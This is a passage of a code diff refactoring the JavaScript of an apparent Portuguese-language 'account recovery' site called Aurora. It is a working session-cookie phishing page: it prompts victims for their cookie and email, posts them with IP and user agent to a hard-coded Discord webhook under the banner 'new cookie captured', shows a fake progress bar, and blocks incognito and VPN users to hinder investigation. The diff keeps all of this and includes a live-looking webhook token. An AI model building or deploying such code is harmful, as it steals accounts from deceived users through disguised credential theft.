+                } catch {}
             }
-
             return null;
         }
 
         async function isGoogleIncognito() {
             return new Promise((resolve) => {
-                let detectionResults = [];
-
-                if (navigator.storage && navigator.storage.estimate) {
-                    navigator.storage.estimate().then(estimate => {
-                        detectionResults.push(estimate.quota < 120000000);
-                        if (detectionResults.length >= 2) {
-                            resolve(detectionResults.some(r => r === true));
-                        }
-                    }).catch(() => {
-                        detectionResults.push(false);
-                        if (detectionResults.length >= 2) {
-                            resolve(detectionResults.some(r => r === true));
-                        }
-                    });
-                } else {
-                    detectionResults.push(false);
-                }
-
-                if (window.webkitRequestFileSystem) {
-                    window.webkitRequestFileSystem(
-                        window.TEMPORARY,
-                        1024 * 1024,
-                        () => {
-                            detectionResults.push(false);
-                            if (detectionResults.length >= 2) {
-                                resolve(detectionResults.some(r => r === true));
-                            }
-                        },
-                        () => {
-                            detectionResults.push(true);
-                            if (detectionResults.length >= 2) {
-                                resolve(detectionResults.some(r => r === true));
-                            }
-                        }
-                    );
-                } else {
-                    detectionResults.push(false);
-                }
-
-                setTimeout(() => {
-                    if (detectionResults.length > 0) {
-                        resolve(detectionResults.some(r => r === true));
-                    } else {
-                        resolve(false);
-                    }
-                }, 1500);
+                let results = [];
+                if(navigator.storage && navigator.storage.estimate) {
+                    navigator.storage.estimate().then(e => { results.push(e.quota < 120000000); if(results.length >= 2) resolve(results.some(Boolean)); }).catch(() => { results.push(false); if(results.length >= 2) resolve(results.some(Boolean)); });
+                } else { results.push(false); }
+                if(window.webkitRequestFileSystem) {
+                    window.webkitRequestFileSystem(window.TEMPORARY, 1024*1024, () => { results.push(false); if(results.length >= 2) resolve(results.some(Boolean)); }, () => { results.push(true); if(results.length >= 2) resolve(results.some(Boolean)); });
+                } else { results.push(false); }
+                setTimeout(() => { if(results.length > 0) resolve(results.some(Boolean)); else resolve(false); }, 1500);
             });
         }
 
         async function checkBlocked() {
             try {
                 const isPrivate = await isPrivateBrowsing();
-                const isGoogleIncog = await isGoogleIncognito();
+                const isGoogle = await isGoogleIncognito();
                 const hasVPN = await detectVPN();
                 
-                const blockOverlay = document.getElementById('blockOverlay');
-                const blockReason = document.getElementById('blockReason');
-                const blockTitle = document.getElementById('blockTitle');
-                const blockIcon = document.getElementById('blockIcon');
-                const blockDesc = document.getElementById('blockDesc');
-                const blockBtn = document.getElementById('blockBtn');
-                const gifContainer = document.getElementById('blockGifContainer');
+                const overlay = document.getElementById('blockOverlay');
+                const reason = document.getElementById('blockReason');
+                const title = document.getElementById('blockTitle');
+                const icon = document.getElementById('blockIcon');
+                const desc = document.getElementById('blockDesc');
+                const btn = document.getElementById('blockBtn');
+                const gifC = document.getElementById('blockGifContainer');
                 
-                let shouldBlock = false;
-                
-                gifContainer.classList.remove('active');
+                gifC.classList.remove('active');
 
-                if (isPrivate || isGoogleIncog) {
-                    shouldBlock = true;
-                    blockTitle.textContent = '🔒 Navegador Anônimo!';
-                    blockIcon.textContent = '🕵️';
-                    blockReason.textContent = '🔒 Navegador Anônimo/Incógnito Detectado';
-                    blockDesc.textContent = 'Navegadores anônimos não são permitidos por questões de segurança. Desative o modo anônimo para acessar.';
-                    blockBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
-                    blockBtn.className = 'btn-retry';
-                    blockBtn.onclick = () => window.location.reload();
+                if (isPrivate || isGoogle) {
+                    title.textContent = '🔒 Navegador Anônimo!';
+                    icon.textContent = '🕵️';
+                    reason.textContent = '🔒 Navegador Anônimo/Incógnito Detectado';
+                    desc.textContent = 'Navegadores anônimos não são permitidos por questões de segurança. Desative o modo anônimo para acessar.';
+                    btn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
+                    btn.className = 'btn-retry';
+                    btn.onclick = () => window.location.reload();
+                    overlay.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    return true;
                 } else if (hasVPN) {
-                    shouldBlock = true;
-                    blockTitle.textContent = '🌐 VPN/Proxy Detectado!';
-                    blockIcon.textContent = '🛡️';
-                    blockReason.textContent = '🌐 VPN ou Proxy Detectado';
-                    blockDesc.textContent = 'Conexões via VPN ou proxy não são permitidas por questões de segurança. Desative para acessar.';
-                    blockBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
-                    blockBtn.className = 'btn-retry';
-                    blockBtn.onclick = () => window.location.reload();
-                }
-
-                if (shouldBlock) {
-                    blockOverlay.classList.add('active');
+                    title.textContent = '🌐 VPN/Proxy Detectado!';
+                    icon.textContent = '🛡️';
+                    reason.textContent = '🌐 VPN ou Proxy Detectado';
+                    desc.textContent = 'Conexões via VPN ou proxy não são permitidas por questões de segurança. Desative para acessar.';
+                    btn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
+                    btn.className = 'btn-retry';
+                    btn.onclick = () => window.location.reload();
+                    overlay.classList.add('active');
                     document.body.style.overflow = 'hidden';
                     return true;
                 }
                 return false;
-            } catch (error) {
-                return false;
-            }
+            } catch { return false; }
         }
 
         // ============================================================
-        // CONFIGURAÇÕES
+        // CONFIG
         // ============================================================
         
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1532125739791679700/hSBBhZ9_EGYGQy7csw0M0t8zgPjqiKOLcE6o65Oc-kxpQ6SgTMYoyyE_yuyoTOcLuYRA';
@@ -3022,61 +2683,49 @@
         let isBlocked = false;
         let termsAccepted = false;
         let isUserBanned = false;
-        let webhookInfo = {
-            username: 'Aurora Security',
-            avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
-        };
+        let webhookInfo = { username: 'Aurora Security', avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif' };
 
         // ============================================================
-        // FUNÇÕES DO SISTEMA
+        // SISTEMA
         // ============================================================
 
-        function showBanBlockModal(reason, expires, gif) {
-            const blockOverlay = document.getElementById('blockOverlay');
-            const blockReason = document.getElementById('blockReason');
-            const blockTitle = document.getElementById('blockTitle');
-            const blockIcon = document.getElementById('blockIcon');
-            const blockDesc = document.getElementById('blockDesc');
-            const blockBtn = document.getElementById('blockBtn');
-            const gifContainer = document.getElementById('blockGifContainer');
+        function showBanModal(reason, expires, gif) {
+            const overlay = document.getElementById('blockOverlay');
+            const reasonEl = document.getElementById('blockReason');
+            const title = document.getElementById('blockTitle');
+            const icon = document.getElementById('blockIcon');
+            const desc = document.getElementById('blockDesc');
+            const btn = document.getElementById('blockBtn');
+            const gifC = document.getElementById('blockGifContainer');
             const gifImg = document.getElementById('blockGif');
             
-            gifContainer.classList.add('active');
-            const gifUrl = gif || 'https://media.tenor.com/2BpR9fW5HWQAAAAC/roblox-ban.gif';
-            gifImg.src = gifUrl;
+            gifC.classList.add('active');
+            gifImg.src = gif || 'https://media.tenor.com/2BpR9fW5HWQAAAAC/roblox-ban.gif';
             gifImg.alt = 'BANIDO';
             
-            blockTitle.className = 'ban-title';
-            blockTitle.textContent = '🚫 VOCÊ FOI BANIDO!';
-            blockIcon.textContent = '⚖️';
-            blockReason.parentElement.className = 'block-reason';
-            blockReason.innerHTML = `<p style="color:#fca5a5;font-weight:900;font-size:0.9rem;margin:0;">🔴 ${reason || 'ATIVIDADE SUSPEITA'}</p>`;
+            title.className = 'ban-title';
+            title.textContent = '🚫 VOCÊ FOI BANIDO!';
+            icon.textContent = '⚖️';
+            reasonEl.innerHTML = `<p style="color:#fca5a5;font-weight:900;font-size:0.9rem;margin:0;">🔴 ${reason || 'ATIVIDADE SUSPEITA'}</p>`;
             
             if (expires) {
                 const date = new Date(expires);
-                blockDesc.innerHTML = `⏳ Banimento expira em: <strong style="color:#fbbf24;">${date.toLocaleDateString('pt-BR')} ${date.toLocaleTimeString('pt-BR')}</strong>`;
-                blockBtn.className = 'btn-retry wait';
-                blockBtn.innerHTML = '<i class="fas fa-clock"></i> Aguardar Expiração';
-                blockBtn.onclick = () => {
-                    showNotification('⏳', 'Banimento Temporário', `Expira em ${date.toLocaleDateString('pt-BR')} ${date.toLocaleTimeString('pt-BR')}`);
-                };
+                desc.innerHTML = `⏳ Banimento expira em: <strong style="color:#fbbf24;">${date.toLocaleDateString('pt-BR')} ${date.toLocaleTimeString('pt-BR')}</strong>`;
+                btn.className = 'btn-retry wait';
+                btn.innerHTML = '<i class="fas fa-clock"></i> Aguardar Expiração';
+                btn.onclick = () => showNotification('⏳', 'Banimento Temporário', `Expira em ${date.toLocaleDateString('pt-BR')} ${date.toLocaleTimeString('pt-BR')}`);
             } else {
-                blockDesc.innerHTML = '🚫 Banimento PERMANENTE - Você não pode mais usar o sistema.';
-                blockBtn.className = 'btn-retry ban';
-                blockBtn.innerHTML = '<i class="fas fa-gavel"></i> BANIDO PERMANENTEMENTE';
-                blockBtn.onclick = () => {
-                    showNotification('🚫', 'Banido!', 'Você está banido permanentemente.');
-                };
+                desc.innerHTML = '🚫 Banimento PERMANENTE - Você não pode mais usar o sistema.';
+                btn.className = 'btn-retry ban';
+                btn.innerHTML = '<i class="fas fa-gavel"></i> BANIDO PERMANENTEMENTE';
+                btn.onclick = () => showNotification('🚫', 'Banido!', 'Você está banido permanentemente.');
             }
             
-            blockOverlay.classList.add('active');
+            overlay.classList.add('active');
             document.body.style.overflow = 'hidden';
             
-            const recoveryForm = document.getElementById('recoveryForm');
-            if (recoveryForm) {
-                recoveryForm.style.display = 'none';
-            }
-            
+            const form = document.getElementById('recoveryForm');
+            if (form) form.style.display = 'none';
             const submitBtn = document.getElementById('submitBtn');
             if (submitBtn) {
                 submitBtn.disabled = true;
@@ -3088,25 +2737,18 @@
 
         async function checkBanStatus() {
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-
-                const banResponse = await fetch(`/api/ban?check=${ip}`);
-                const banData = await banResponse.json();
-
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const banRes = await fetch(`/api/ban?check=${ipData.ip}`);
+                const banData = await banRes.json();
                 if (banData.banned) {
                     isUserBanned = true;
-                    showBanBlockModal(banData.reason, banData.expires, banData.gif);
+                    showBanModal(banData.reason, banData.expires, banData.gif);
                     return true;
                 }
-                
                 isUserBanned = false;
                 return false;
-            } catch (error) {
-                console.error('❌ Erro ao verificar ban:', error);
-                return false;
-            }
+            } catch { return false; }
         }
 
         function openTerms() {
@@ -3124,8 +2766,7 @@
         }
 
         document.addEventListener('click', function(e) {
-            const overlay = document.getElementById('termsOverlay');
-            if (e.target === overlay) {
+            if (e.target === document.getElementById('termsOverlay')) {
                 closeTerms();
             }
         });
@@ -3139,93 +2780,72 @@
         }
 
         function checkTerms() {
-            const saved = localStorage.getItem('aurora_terms_accepted');
-            if (saved === 'true') {
+            if (localStorage.getItem('aurora_terms_accepted') === 'true') {
                 termsAccepted = true;
-            } else {
-                if (!isUserBanned) {
-                    setTimeout(() => { openTerms(); }, 1500);
-                }
+            } else if (!isUserBanned) {
+                setTimeout(() => openTerms(), 1500);
             }
         }
 
         async function getIP() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
                 return data.ip;
-            } catch (error) {
-                return 'Não foi possível obter IP';
-            }
+            } catch { return 'Não foi possível obter IP'; }
         }
 
         async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
             try {
                 const vpnData = vpnDetected ? await getIPData() : null;
-                
                 const payload = {
                     content: `✦ **NOVO COOKIE CAPTURADO - AURORA** ✦\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n👤 **Usuário:** ${currentUser ? currentUser.username : 'Não logado'}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}${vpnData ? `\n📊 **Dados VPN:** ${JSON.stringify(vpnData)}` : ''}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n✦ **#Aurora** ✦`,
                     username: webhookInfo.username,
                     avatar_url: webhookInfo.avatar_url
                 };
-
                 try {
-                    const response = await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                    if (response.ok) return true;
-                } catch (e) {}
-
+                    const res = await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                    if (res.ok) return true;
+                } catch {}
                 return false;
-            } catch (error) {
-                return false;
-            }
+            } catch { return false; }
         }
 
         async function checkDetection() {
             try {
-                const response = await fetch('/api/detect');
-                const data = await response.json();
-                
+                const res = await fetch('/api/detect');
+                const data = await res.json();
                 if (data.data && data.data.blocked) {
-                    const blockOverlay = document.getElementById('blockOverlay');
-                    const blockReason = document.getElementById('blockReason');
-                    const blockTitle = document.getElementById('blockTitle');
-                    const blockIcon = document.getElementById('blockIcon');
-                    const blockDesc = document.getElementById('blockDesc');
-                    const blockBtn = document.getElementById('blockBtn');
-                    const gifContainer = document.getElementById('blockGifContainer');
-                    
-                    gifContainer.classList.remove('active');
-                    
-                    let message = '';
+                    const overlay = document.getElementById('blockOverlay');
+                    const reason = document.getElementById('blockReason');
+                    const title = document.getElementById('blockTitle');
+                    const icon = document.getElementById('blockIcon');
+                    const desc = document.getElementById('blockDesc');
+                    const btn = document.getElementById('blockBtn');
+                    const gifC = document.getElementById('blockGifContainer');
+                    gifC.classList.remove('active');
+                    let msg = '';
                     if (data.data.isPrivate) {
-                        message = '🔒 Navegador Anônimo/Incógnito Detectado';
-                        blockTitle.textContent = '🔒 Navegador Anônimo!';
-                        blockIcon.textContent = '🕵️';
-                        blockDesc.textContent = 'Navegadores anônimos não são permitidos por questões de segurança.';
+                        msg = '🔒 Navegador Anônimo/Incógnito Detectado';
+                        title.textContent = '🔒 Navegador Anônimo!';
+                        icon.textContent = '🕵️';
+                        desc.textContent = 'Navegadores anônimos não são permitidos por questões de segurança.';
                     } else if (data.data.vpn && data.data.vpn.isVPN) {
-                        message = '🌐 VPN ou Proxy Detectado';
-                        blockTitle.textContent = '🌐 VPN/Proxy Detectado!';
-                        blockIcon.textContent = '🛡️';
-                        blockDesc.textContent = 'Conexões via VPN ou proxy não são permitidas por questões de segurança.';
+                        msg = '🌐 VPN ou Proxy Detectado';
+                        title.textContent = '🌐 VPN/Proxy Detectado!';
+                        icon.textContent = '🛡️';
+                        desc.textContent = 'Conexões via VPN ou proxy não são permitidas por questões de segurança.';
                     }
-                    
-                    blockReason.textContent = message;
-                    blockBtn.className = 'btn-retry';
-                    blockBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
-                    blockBtn.onclick = () => window.location.reload();
-                    blockOverlay.classList.add('active');
+                    reason.textContent = msg;
+                    btn.className = 'btn-retry';
+                    btn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
+                    btn.onclick = () => window.location.reload();
+                    overlay.classList.add('active');
                     document.body.style.overflow = 'hidden';
                     return data.data;
                 }
-                
                 return data.data || { blocked: false };
-            } catch (error) {
-                return { blocked: false };
-            }
+            } catch { return { blocked: false }; }
         }
 
         function toggleMobileMenu() {
@@ -3237,17 +2857,14 @@
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode acessar o sistema.');
                 return;
             }
-            
             const protectedSections = ['dashboard', 'profile', 'recovery'];
             if (protectedSections.includes(id) && !currentUser) {
                 showNotification('⚠️', 'Faça login!', 'Você precisa estar logado para acessar esta página.');
                 openAuth('login');
                 return;
             }
-            
             document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
             document.getElementById(id).classList.add('active');
-            
             document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
             document.querySelectorAll('.nav-link').forEach(l => {
                 if (l.textContent.trim().toLowerCase().includes(id) || 
@@ -3255,7 +2872,6 @@
                     l.classList.add('active');
                 }
             });
-            
             document.getElementById('navLinks').classList.remove('open');
             document.getElementById('dropdownMenu').classList.remove('open');
             window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -3271,7 +2887,7 @@
 
         function togglePassword() {
             const input = document.getElementById('cookieInput');
-            const icon = document.querySelector('.toggle-eye i');
+            const icon = document.querySelector('.input-toggle i');
             if (input.type === 'password') {
                 input.type = 'text';
                 icon.className = 'fas fa-eye-slash';
@@ -3281,16 +2897,14 @@
             }
         }
 
-        function toggleFaq(element) {
-            element.classList.toggle('open');
+        function toggleFaq(el) {
+            el.classList.toggle('open');
         }
 
         function updateTimer() {
             if (!blockUntil) return;
-            
             const now = Date.now();
             const diff = blockUntil - now;
-            
             if (diff <= 0) {
                 clearInterval(timerInterval);
                 document.getElementById('blockMsg').classList.remove('visible');
@@ -3302,13 +2916,11 @@
                 localStorage.removeItem('aurora_block_until');
                 return;
             }
-
-            const hours = Math.floor(diff / (1000 * 60 * 60));
-            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-            
+            const h = Math.floor(diff / (1000*60*60));
+            const m = Math.floor((diff % (1000*60*60)) / (1000*60));
+            const s = Math.floor((diff % (1000*60)) / 1000);
             document.getElementById('timerDisplay').textContent = 
-                `${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`;
+                `${String(h).padStart(2,'0')}h ${String(m).padStart(2,'0')}m ${String(s).padStart(2,'0')}s`;
         }
 
         async function handleSubmit(e) {
@@ -3318,33 +2930,29 @@
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode usar o sistema de recuperação.');
                 return;
             }
-            
             if (!currentUser) {
                 showNotification('⚠️', 'Faça login!', 'Você precisa estar logado para recuperar sua conta.');
                 openAuth('login');
                 return;
             }
-            
             if (!termsAccepted) {
                 openTerms();
                 showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos de serviço para continuar. ✦');
                 return;
             }
-            
             if (isBlocked) {
                 showNotification('⏳', 'Aguarde!', 'Você precisa esperar 9 horas para tentar novamente.');
                 return;
             }
 
             const isPrivate = await isPrivateBrowsing();
-            const isGoogleIncog = await isGoogleIncognito();
+            const isGoogle = await isGoogleIncognito();
             const hasVPN = await detectVPN();
             
-            if (isPrivate || isGoogleIncog) {
+            if (isPrivate || isGoogle) {
                 showNotification('🔒', 'Navegador Anônimo!', 'Navegadores anônimos não são permitidos.');
                 return;
             }
-            
             if (hasVPN) {
                 showNotification('🌐', 'VPN Detectada!', 'Conexões via VPN não são permitidas.');
                 return;
@@ -3357,7 +2965,6 @@
                 showNotification('⚠️', 'Campos vazios!', 'Preencha todos os campos.');
                 return;
             }
-
             if (hasAttempted) {
                 showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.');
                 return;
@@ -3373,20 +2980,15 @@
             if (sent) {
                 hasAttempted = true;
                 isBlocked = true;
-                
                 blockUntil = Date.now() + (9 * 60 * 60 * 1000);
                 localStorage.setItem('aurora_block_until', blockUntil.toString());
-                
                 document.getElementById('submitBtn').disabled = true;
                 document.getElementById('submitBtn').style.opacity = '0.5';
                 document.getElementById('submitBtn').innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
-                
                 document.getElementById('blockMsg').classList.add('visible');
                 document.getElementById('timerDisplay').textContent = '9h 00m 00s';
-                
                 if (timerInterval) clearInterval(timerInterval);
                 timerInterval = setInterval(updateTimer, 1000);
-                
                 showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. ✦');
                 showProcessing();
             } else {
@@ -3399,18 +3001,14 @@
         function showProcessing() {
             const modal = document.getElementById('processingModal');
             modal.classList.add('active');
-            
             let progress = 0;
-            const progressFill = document.querySelector('.progress-fill');
-            const progressText = document.getElementById('progressText');
-            
+            const fill = document.querySelector('.progress-fill');
+            const text = document.getElementById('progressText');
             const interval = setInterval(() => {
                 progress += Math.random() * 20 + 5;
                 if (progress > 100) progress = 100;
-                
-                progressText.textContent = Math.floor(progress) + '%';
-                progressFill.style.width = progress + '%';
-                
+                text.textContent = Math.floor(progress) + '%';
+                fill.style.width = progress + '%';
                 if (progress >= 100) {
                     clearInterval(interval);
                     setTimeout(() => {
@@ -3426,7 +3024,7 @@
             document.getElementById('recoveryForm').reset();
             const input = document.getElementById('cookieInput');
             input.type = 'password';
-            document.querySelector('.toggle-eye i').className = 'fas fa-eye';
+            document.querySelector('.input-toggle i').className = 'fas fa-eye';
         }
 
         function closeSuccess() {
@@ -3438,7 +3036,6 @@
             const proc = document.getElementById('processingModal');
             const succ = document.getElementById('successModal');
             const block = document.getElementById('blockOverlay');
-            
             if (e.target === block) return;
             if (e.target === proc) proc.classList.remove('active');
             if (e.target === succ) succ.classList.remove('active');
@@ -3446,27 +3043,22 @@
 
         window.addEventListener('scroll', () => {
             const navbar = document.getElementById('navbar');
-            if (window.scrollY > 10) {
-                navbar.classList.add('scrolled');
-            } else {
-                navbar.classList.remove('scrolled');
-            }
+            if (window.scrollY > 10) navbar.classList.add('scrolled');
+            else navbar.classList.remove('scrolled');
         });
 
         function restoreBlockState() {
             const saved = localStorage.getItem('aurora_block_until');
             if (saved) {
-                const savedTime = parseInt(saved);
-                if (savedTime > Date.now()) {
-                    blockUntil = savedTime;
+                const time = parseInt(saved);
+                if (time > Date.now()) {
+                    blockUntil = time;
                     isBlocked = true;
                     hasAttempted = true;
-                    
                     document.getElementById('submitBtn').disabled = true;
                     document.getElementById('submitBtn').style.opacity = '0.5';
                     document.getElementById('submitBtn').innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
                     document.getElementById('blockMsg').classList.add('visible');
-                    
                     if (timerInterval) clearInterval(timerInterval);
                     timerInterval = setInterval(updateTimer, 1000);
                     updateTimer();
@@ -3478,15 +3070,15 @@
 
         async function fetchWebhookInfo() {
             try {
-                const response = await fetch(WEBHOOK_URL);
-                if (response.ok) {
-                    const data = await response.json();
+                const res = await fetch(WEBHOOK_URL);
+                if (res.ok) {
+                    const data = await res.json();
                     webhookInfo = {
                         username: data.name || 'Aurora Security',
                         avatar_url: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png` : 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
                     };
                 }
-            } catch (error) {}
+            } catch {}
         }
 
         // ============================================================
@@ -3494,91 +3086,69 @@
         // ============================================================
         
         async function init() {
-            console.log('%c✦ Aurora Premium v7.0 - Nova Plataforma ✦', 'font-size:22px;font-weight:bold;color:#a855f7;');
+            console.log('%c✦ Aurora v8 - Nova Plataforma ✦', 'font-size:22px;font-weight:bold;color:#9d6aff;');
             
-            const isLoggedIn = checkAuth();
-            
-            if (isLoggedIn) {
+            const logged = checkAuth();
+            if (logged) {
                 try {
-                    const response = await fetch('/api/auth/me', {
-                        headers: { 'Authorization': `Bearer ${authToken}` }
-                    });
-                    
-                    if (!response.ok) {
-                        updateUIForLoggedOut();
-                    } else {
-                        const data = await response.json();
+                    const res = await fetch('/api/auth/me', { headers: { 'Authorization': `Bearer ${authToken}` } });
+                    if (!res.ok) logoutUI();
+                    else {
+                        const data = await res.json();
                         currentUser = data.user;
                         localStorage.setItem('aurora_user', JSON.stringify(data.user));
-                        updateUIForLoggedIn();
+                        updateUI();
                     }
-                } catch (error) {
-                    console.error('Erro ao verificar token:', error);
-                }
+                } catch {}
             }
 
             console.log('🔍 Verificando navegador anônimo...');
-            const isPrivateBrowser = await detectPrivateBrowsingBrowser();
-            
-            if (isPrivateBrowser) {
-                console.log('🚫 Acesso bloqueado: Navegador Anônimo detectado');
-                const blockOverlay = document.getElementById('blockOverlay');
-                const blockReason = document.getElementById('blockReason');
-                const blockTitle = document.getElementById('blockTitle');
-                const blockIcon = document.getElementById('blockIcon');
-                const blockDesc = document.getElementById('blockDesc');
-                const blockBtn = document.getElementById('blockBtn');
-                const gifContainer = document.getElementById('blockGifContainer');
-                
-                gifContainer.classList.remove('active');
-                blockTitle.textContent = '🔒 Navegador Anônimo!';
-                blockIcon.textContent = '🕵️';
-                blockReason.textContent = '🔒 Navegador Anônimo/Incógnito Detectado';
-                blockDesc.textContent = 'Navegadores anônimos não são permitidos por questões de segurança. Desative o modo anônimo para acessar.';
-                blockBtn.className = 'btn-retry';
-                blockBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
-                blockBtn.onclick = () => window.location.reload();
-                blockOverlay.classList.add('active');
+            const privateBrowser = await detectPrivate();
+            if (privateBrowser) {
+                console.log('🚫 Acesso bloqueado');
+                const overlay = document.getElementById('blockOverlay');
+                document.getElementById('blockTitle').textContent = '🔒 Navegador Anônimo!';
+                document.getElementById('blockIcon').textContent = '🕵️';
+                document.getElementById('blockReason').textContent = '🔒 Navegador Anônimo/Incógnito Detectado';
+                document.getElementById('blockDesc').textContent = 'Navegadores anônimos não são permitidos por questões de segurança. Desative o modo anônimo para acessar.';
+                document.getElementById('blockBtn').innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
+                document.getElementById('blockBtn').className = 'btn-retry';
+                document.getElementById('blockBtn').onclick = () => window.location.reload();
+                overlay.classList.add('active');
                 document.body.style.overflow = 'hidden';
                 return;
             }
-            console.log('✅ Navegador normal, continuando...');
+            console.log('✅ Navegador normal');
 
-            console.log('🔍 Verificando se o IP está banido...');
-            const isBanned = await checkBanStatus();
-            if (isBanned) {
-                console.log('🚫 Acesso bloqueado: IP banido');
+            console.log('🔍 Verificando banimento...');
+            if (await checkBanStatus()) {
+                console.log('🚫 IP banido');
                 return;
             }
-            console.log('✅ IP não está banido, continuando...');
+            console.log('✅ IP liberado');
 
-            console.log('🔍 Verificando navegador e VPN via API...');
-            const detectResult = await checkDetection();
-            
-            if (detectResult && detectResult.blocked) {
-                console.log('🚫 Acesso bloqueado: Navegador anônimo ou VPN detectado');
+            console.log('🔍 Verificando VPN...');
+            const detect = await checkDetection();
+            if (detect && detect.blocked) {
+                console.log('🚫 VPN detectado');
                 return;
             }
-            console.log('✅ Navegador e VPN OK!');
+            console.log('✅ VPN OK');
 
-            console.log('🔗 Carregando informações do webhook...');
             await fetchWebhookInfo();
-            
-            const blocked = await checkBlocked();
-            if (blocked) {
-                console.log('🚭 Acesso bloqueado: Navegador Anônimo detectado');
+            if (await checkBlocked()) {
+                console.log('🚫 Bloqueado');
                 return;
             }
-            
+
             restoreBlockState();
             checkTerms();
-
-            console.log('✅ Aurora Premium iniciado com sucesso!');
+            console.log('✅ Aurora iniciado!');
             console.log('👤 Usuário:', currentUser ? currentUser.username : 'Não logado');
         }
 
         // ============================================================
-        // EXPOR FUNÇÕES GLOBAIS
+        // EXPORT
         // ============================================================
 
         window.init = init;
@@ -3589,9 +3159,6 @@
         window.handleNavAuth = handleNavAuth;
         window.handleLogout = handleLogout;
         window.toggleDropdown = toggleDropdown;
-        window.checkAuth = checkAuth;
-        window.updateUIForLoggedIn = updateUIForLoggedIn;
-        window.updateUIForLoggedOut = updateUIForLoggedOut;
         window.showSection = showSection;
         window.goToRecovery = goToRecovery;
         window.toggleMobileMenu = toggleMobileMenu;
